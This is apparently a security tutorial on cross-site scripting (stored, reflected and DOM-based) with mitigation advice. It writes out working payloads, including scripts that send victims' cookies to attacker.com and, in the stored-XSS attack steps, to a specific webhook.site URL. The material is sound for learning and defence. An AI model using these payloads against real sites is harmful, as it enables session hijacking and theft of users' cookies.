### Overview
XSS, short for Cross-Site Scripting, is a common web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS occurs when an application does not properly validate, sanitize, or escape user-supplied data before displaying it in the web page's output.

#### Example Payloads
1. **Stored (Persistent) XSS:** An attacker injects a malicious script into a web application's comment section, and the script is stored in the application's database. When other users view the comments section, the malicious script is executed in their browsers, leading to unauthorized actions or data theft.
    
    Example: User input: `<script>alert('XSS Attack!');</script>` Stored as a comment: `<div>User123: <script>alert('XSS Attack!');</script></div>`
    
2. **Reflected XSS:** An attacker crafts a malicious link and tricks a user into clicking it. The URL contains the malicious script, and the server reflects it back in the response. When the user clicks the link, the script is executed in their browser.
    
    Example: Attacker crafts a URL: `https://example.com/search?q=<script>alert('XSS Attack!');</script>` The page displays: "Search results for: `<script>alert('XSS Attack!');</script>`"
    
3. **DOM-based XSS:** An attacker manipulates the DOM of a web page by injecting a malicious script. This script executes in the user's browser when the page is loaded or when a specific action is triggered.
    
    Example: Attacker manipulates the URL using JavaScript: `https://example.com/page#<script>alert('XSS Attack!');</script>` The JavaScript in the page's code executes the script when the URL changes.
    
4. **XSS via Form Input:** An attacker exploits a vulnerable form input field to inject a malicious script. When the form is submitted and the data is displayed back to the user, the script executes in their browser.
    
    Example: An input field is vulnerable to XSS: `<input type="text" name="search" value="user_input">` The attacker submits the following input: `<script>alert('XSS Attack!');</script>` The page displays: "You searched for: `<script>alert('XSS Attack!');</script>`"
    
5. **XSS via Cookie:** An attacker injects a malicious script into a user's cookie value. When the user visits a vulnerable website, the script is executed in their browser.
    
    Example: Attacker sets the following cookie in the user's browser: `document.cookie = "session=<script>alert('XSS Attack!');</script>";` When the user visits a vulnerable website, the script is executed.

#### Mitigation
- **Input Validation and Sanitization:** Validate and sanitize all user input, ensuring that it adheres to the expected format and does not contain malicious content.
- **Output Encoding:** Encode user-supplied data before displaying it in the web page output. This prevents browsers from interpreting the data as executable code.
- **Content Security Policy (CSP):** Implement a CSP to specify which sources of content are allowed to be loaded, mitigating the risk of executing malicious scripts.
- **HTTP Only and Secure Flags:** Set the HTTP Only and Secure flags for cookies to prevent client-side scripts from accessing sensitive cookie data.
- **Escape Untrusted Data in Templates:** When using templates, ensure that untrusted data is properly escaped, preventing it from being treated as executable code.
- **Use Framework Security Features:** Use security features provided by web frameworks to help protect against XSS vulnerabilities.
- **Regular Security Testing:** Perform security testing, including manual and automated testing, to identify and fix potential XSS vulnerabilities.


### XSS Types
#### Overview
1. **Stored (Persistent) XSS:** In a stored XSS attack, the malicious script is permanently stored on the server, such as in a database or user comments. When other users view the page with the stored malicious script, their browsers execute it, potentially leading to session hijacking, data theft, or other malicious activities.
2. **Reflected XSS:** In a reflected XSS attack, the malicious script is included in the URL or in a request parameter. When the server processes the request, it reflects the script back in the response. The user's browser then executes the malicious script, leading to the exploitation of the user's session or stealing sensitive information.
3. **DOM-based XSS:** DOM-based XSS occurs when the malicious script is executed on the client-side, manipulating the Document Object Model (DOM) of the web page. This type of XSS is typically harder to detect, as the malicious code does not go to the server-side, making it less visible in traditional security measures.

The impact of an XSS vulnerability can be severe, including unauthorized access, data theft, phishing attacks, cookie theft, defacement of web pages, and more.

#### DOM-Based XSS
##### Overview
DOM-based XSS (Cross-Site Scripting) is a type of XSS attack that occurs on the client-side, within the Document Object Model (DOM) of a web page. Unlike traditional XSS, where the injection and exploitation occur on the server-side, DOM-based XSS involves manipulating the client-side DOM elements using JavaScript to execute malicious code.

In DOM-based XSS attacks, the vulnerable web application includes user-supplied data in the page's DOM without proper validation or encoding. The browser then interprets this data as executable code, leading to the execution of the injected script in the user's browser.

Here's an overview of the steps involved in a DOM-based XSS attack:

1. **Identify a Vulnerable Point:** The attacker identifies a point in the web application where user-supplied data is directly included in the DOM.
2. **Craft the Payload:** The attacker crafts a malicious payload containing JavaScript code to be injected into the DOM.
3. **Exploitation:** When the user interacts with the vulnerable web page or performs specific actions (e.g., clicking a link, submitting a form), the injected script is executed in the user's browser, leading to unauthorized actions, data theft, or other malicious activities.
    

DOM-based XSS attacks can be categorized into two main types:

1. **Client-Side DOM-based XSS:** 
	- In client-side DOM-based XSS, the malicious script's execution and impact occur entirely on the client-side without interacting with the server. The payload manipulation and exploitation occur within the browser itself.
	```js
	<script>   var user_input = location.hash.substring(1);   
	document.write("Hello, " + user_input); </script>
	```
	- If an attacker crafts the following URL:
	```js
	https://example.com/page#<script>alert('XSS Attack!');</script>
	```
	- When a user visits this URL, the script `alert('XSS Attack!')` will be executed directly in their browser, triggering an alert with the text "XSS Attack!"
2. **DOM-based XSS with Indirect Server Interaction:** 
	- In this type, the malicious payload is initially included in the DOM through client-side manipulation, but its execution involves interactions with the server.
	```js
	<script>   var user_input = location.hash.substring(1);   var output = "<div>Hello, " + 
	user_input + "</div>";   document.getElementById('output').innerHTML = output; 
	</script>  <div id="output"></div>
	```
	- If an attacker crafts the following URL:
	```js
	https://example.com/page#<script>var xhr = new XMLHttpRequest();xhr.open('GET', 'https://attacker.com/steal?data=' + document.cookie, true);xhr.send();</script>
	```
	- The script will send the user's cookies to the attacker's server, potentially leading to unauthorized access.

##### Attack Vector
1. **Find a parameter that its value is printed on the document**
2. **Try injection scripts**:
	```js
	<script>alert(1)</script>
	<img src=x onerror=prompt(1)>
	<img src=x onerror=window.location.href="https://google.com">
	```

#### Stored XSS
##### Overview
Stored XSS (Cross-Site Scripting) is a type of XSS attack where the malicious script is permanently stored on the target server and then served to other users when they access a particular page or resource. Unlike reflected XSS, where the injected script is reflected back in the response, stored XSS attacks store the malicious script in a database, comment section, user profile, or any other persistent storage on the server.

The stored malicious script is then rendered and executed whenever the affected page is loaded by other users. This allows the attacker to target multiple users at once, increasing the potential impact of the attack.

Here's an overview of the steps involved in a stored XSS attack:

1. **Identify a Vulnerable Point:** The attacker identifies a point in the web application where user-supplied data is stored on the server without proper validation or encoding. Common examples include comment forms, user profile fields, forum posts, and message boards.
2. **Craft the Payload:** The attacker crafts a malicious payload containing JavaScript code to be injected into the application's persistent storage.
3. **Store the Payload:** The attacker submits the malicious payload via the vulnerable input field, and the application stores the payload in its database or another form of persistent storage.
4. **Exploitation:** When other users access the page where the stored payload is served, their browsers interpret the script as executable code, leading to the execution of the injected script in their browsers. This can lead to session hijacking, data theft, unauthorized actions, or other malicious activities.

Examples of Stored XSS attacks:

1. **Comment Section:** Attack Scenario:
	- The attacker writes a comment containing a malicious script on a blog post or article.
	- The blog application stores the comment in its database without proper validation or encoding.
	- When other users view the blog post, the malicious script is loaded and executed in their browsers.
	```js
	Comment: "<script>alert('XSS Attack!');</script>"
	```
	- When other users view the blog post and its comments, they will see an alert box with the text "XSS Attack!"
2. **User Profile Field:** Attack Scenario:
	- The attacker updates their user profile with a malicious script in one of the fields.
	- The application stores the user profile in its database without proper validation or encoding.
	- When other users view the attacker's profile page, the malicious script is loaded and executed in their browsers.
	```js
	User Profile Bio: "<script>window.location.href='https://attacker.com/steal?
	data='+document.cookie;</script>"
	```
	- When other users visit the attacker's profile page, their browsers will be redirected to the attacker's website, and the user's cookies will be sent to the attacker.
3. **Forum Post:** Attack Scenario:
	- The attacker creates a new forum thread or posts a reply containing a malicious script.
	- The forum application stores the post in its database without proper validation or encoding.
	- When other users read the thread or view the replies, the malicious script is loaded and executed in their browsers.
	```js
		Forum Post: "Check out this cool website: <script>fetch('https://attacker.com/log?
		data='+document.cookie);</script>"
	```
	- When other users view the forum post, their browsers will make a request to the attacker's server, potentially leaking their cookies.
4. **Message Boards**: Attack Scenario:
	- The attacker submits a message containing a malicious script on a message board.
	- The message board application stores the message without proper validation or encoding.
	- When other users read the message, the malicious script is loaded and executed in their browsers.
	```js
	Message: "Important Update: <script>document.write('Site under attack!');</script>"
	```
	- When other users read the message, the script will be executed, and they will see the text "Important Update: Site under attack!" displayed on the page.

##### Attack Vector
1. **Find a parameter that its value is stored in the document or any other page**
2. **Try injection scripts**:
	```js
	<script>alert(1)</script>
	<img src=x onerror=prompt(1)>
	<img src=x onerror=window.location.href="https://google.com">
	```
3. **Connect the user of the website to your webhook**:
	```js
	<script> var i = new Image; i.src = "https://webhook.site/d73c9ce0-01e0-46e9-b192-774161b3fcd9/?"
	+ document.cookie; </script> 
	```
